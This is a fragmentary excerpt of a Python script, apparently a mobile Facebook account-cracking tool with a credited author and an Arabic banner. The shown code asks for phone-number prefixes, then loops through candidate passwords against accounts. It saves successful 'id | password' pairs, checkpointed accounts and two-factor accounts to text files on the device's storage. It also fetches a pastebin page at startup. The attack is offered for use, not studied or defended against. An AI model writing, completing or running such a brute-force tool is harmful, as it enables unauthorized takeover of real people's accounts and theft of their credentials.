...
os.system('am start https://www.facebook.com/profile.php?id=100010747843370')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100010747843370")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/k1ts1ePa").text
...
رﻮﺑﺯ ﺪﻴﺻ ﻂﺸﻧ ﺪﻴﺼﺗ تﺍﺩﺍ                                                                                                                                                                                       
  AUTHOR   :   Abdo Al  Gharyani
  FACEBOOK :   Abdo Al  Gharyani
  GITHUB    :   #####
  LIFE STATUS  :  Abdo Al  Gharyani
  FB GROUP  : Abdo Al  Gharyani 0002
...
def xyz():
    ...
    os.system("clear");
    print(logo)
    print('           \x1b[97m[\033[37;41m  Abdo Al  Gharyani   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  Abdo Al  Gharyani   \033[0;m]")
    print(f"")
    linex()
    ...
    print(f"21892 ,21894 , 21891 ,21893")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Abdo-OK.txt', 'a').write(cid + ' | ' + ps + '\n')
                oks.append(cid)
                break
                ...
                print(
                    f'\r{Red}[×]--------------------[Abdo-CP🥺😥]---------------------[×]\nNUMBER : ' + uid + '\nUID   : ' + cid + ' √ ' + ps + '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/Abdo-CP.txt', 'a').write(cid + ' | ' + ps + '\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Abdo-2F.txt', 'a').write(cid + ' | ' + ps + '\n')
                twf.append(cid)
            else:
                continue
        loop += 1
        sys.stdout.write(f'\r\33[1;37m[Abdo ] [%s]\33[1;97m [OK:%s~CP:%s]' % (loop, len(oks), len(cps))),
        sys.stdout.flush()
        checks(oks, cps, twf)
    except:
        pass
